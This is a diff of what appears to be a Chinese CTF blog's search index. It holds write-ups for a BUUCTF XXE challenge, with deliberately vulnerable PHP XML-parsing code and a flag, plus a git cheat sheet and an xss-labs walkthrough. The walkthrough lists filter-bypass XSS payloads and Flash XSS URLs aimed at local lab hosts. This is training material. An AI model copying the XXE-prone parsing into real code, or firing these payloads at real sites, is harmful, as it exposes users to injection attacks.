-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">/**
-* autor: c0ny1
-* date: 2018-2-7
-*/</span>
-
-<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
-<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
-<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
-
-<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
-	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
-	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
-
-	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>	
-<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
-<ul>
-<li>etc&#x2F;hosts </li>
-<li>proc&#x2F;net&#x2F;arp<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2022/11/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p>先看源码没发现啥</p>
@@ -763,6 +763,38 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
+    <title>git命令</title>
+    <url>/2022/11/git/</url>
+    <content><![CDATA[<h1 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git的一个隐藏文件，这时，本地库已经初始化完成.</p>
+<h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>git add 命令可将该文件添加到暂存区。</p>
+<p>添加一个或多个文件到暂存区</p>
+<h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>[message] 可以是一些备注信息。</p>
+<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p>
+<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p>
+<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token parameter variable">-f</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h1><h2 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h2><p>显示所有远程仓库：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>git pull 命令用于从远程获取代码并合并本地的版本。 </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>远程分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>本地分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>git push 命用于从将本地的分支版本上传到远程并合并。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>本地分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>远程分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hackthebox合集</title>
     <url>/2022/11/htb/</url>
     <content><![CDATA[<p>共做出三道题，前两道题wp正在补，但现在又有点想转去做vulnhub</p>
@@ -826,38 +858,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       <tags>
         <tag>web</tag>
         <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git命令</title>
-    <url>/2022/11/git/</url>
-    <content><![CDATA[<h1 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git的一个隐藏文件，这时，本地库已经初始化完成.</p>
-<h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h1 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>git add 命令可将该文件添加到暂存区。</p>
-<p>添加一个或多个文件到暂存区</p>
-<h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>[message] 可以是一些备注信息。</p>
-<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p>
-<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p>
-<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">mv</span> <span class="token parameter variable">-f</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span> <span class="token punctuation">[</span>newfile<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h1><h2 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h2><p>显示所有远程仓库：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>git pull 命令用于从远程获取代码并合并本地的版本。 </p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>远程分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>本地分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>git push 命用于从将本地的分支版本上传到远程并合并。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push <span class="token operator">&lt;</span>远程主机名<span class="token operator">></span> <span class="token operator">&lt;</span>本地分支名<span class="token operator">></span>:<span class="token operator">&lt;</span>远程分支名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -995,6 +995,57 @@ sig <span class="token operator">=</span> base64<span class="token punctuation">
       </tags>
   </entry>
   <entry>
+    <title>xss-lab</title>
+    <url>/2022/11/xsslab/</url>
+    <content><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>没啥好说的<br>直接alert<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7cff66907f234fe8a9264319b7fcb8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+//改后是
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……>//
+1111"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……这是输入的部分
+前后闭合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/1e4c13e4bc1d4537880deaf36855ab42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用了htmlspeialchars()函数	&lt;&gt;”都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7c28fa1a02bd4383ac5f0cb8df3f3f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">二者都写可以</p>
+<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>和上面一样</p>
+<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>on 和 script都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/ec2a556e55ba4c9b84c5a07d3aedff9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这里用javascript:伪协议<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3d92413c5c624059aab10d022aefcf04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">出来的链接就是答案</p>
+<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>可以大小写绕过</p>
+<h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>把特殊字符便空了<br>可以双写绕过</p>
+<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这关卡的死死的<br>要编码绕过<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d233b7b1bba44b50b4aeeab90330e7e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<h1 id="level-9"><a href="#level-9" class="headerlink" title="level  9"></a>level  9</h1><p>strpos函数看是否有http:&#x2F;&#x2F;<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把http:&#x2F;&#x2F;放最后面用&#x2F;&#x2F;注释掉<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/9d5db481746d4a9f95e8001a62ccd7bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h1><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框text</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css">type=<span class="token string">"text"</span> onclick=<span class="token string">"alert(1)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>后面几关都要改t_sort<br>因为后端获取t_sort和user-agent等<br>要从相应注入点注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2040ace8d49d4257a8553820b103ff93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><blockquote>
+<p>exif xss漏洞，exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p>
+<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br>但是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b0ccd08d54844a0ab8326ecdebed2497.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a28e85a7ace44b67a82fb0f28009f4a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+</blockquote>
+<h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>对script、&#x2F;、空格进行了转换<br>空格不可以就用换行符</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;a%0atype=<span class="token string">"text"</span>%0a<span class="token string">"alert"</span>><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3636897a078a4392a3d629c6eabb3715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>火狐不支持swf格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b402d2307f0f45baacade379e596da50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>要找个支持flash的浏览器才能正常打开<br>17-20关都能用flash xss<br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br>但这里先用别的办法<br>以18关为例<br>注入点可以在arg02<br>但是你连swf都没有哪来的moouseover哪<br>所以得url连接一下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>xss<span class="token operator">-</span>labs<span class="token operator">/</span>level18<span class="token punctuation">.</span>php<span class="token operator">/</span>xsf02<span class="token punctuation">.</span>swf?a<span class="token operator">=</span>?arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">%</span>20onmouseover<span class="token operator">=</span>javascript<span class="token punctuation">:</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d2caecf88dc64e4fbbfe4d6aff041882.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h1><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler">flash反编译工具</a><br>以下是大佬的payload</p>
+<blockquote>
+<p>卑微小杨在线emo<br>flash反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持flash的浏览器真没法做</p>
+<p>18关</p>
+</blockquote>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="token string">"javascript:alert(/bmfx/)"</span>>bmfx&lt;/a> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>19关</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token selector">catch(e)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>/bmfx/<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>//%26width=998%26height=998<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<script>
+setTimeout(function () {
+    alert('xss');
+}, 1000);
+</script>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+        <tag>xss-lab</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>终端便捷ssh（免密）连接</title>
     <url>/2022/11/%E5%85%8D%E5%AF%86ssh%E7%99%BB%E5%BD%95/</url>
     <content><![CDATA[<h1 id="普通ssh方法"><a href="#普通ssh方法" class="headerlink" title="普通ssh方法"></a>普通ssh方法</h1><p>物理机ssh连接虚拟机</p>
@@ -1057,57 +1108,6 @@ The key's randomart image is:
       <tags>
         <tag>web</tag>
         <tag>ssh</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss-lab</title>
-    <url>/2022/11/xsslab/</url>
-    <content><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>没啥好说的<br>直接alert<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7cff66907f234fe8a9264319b7fcb8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-//改后是
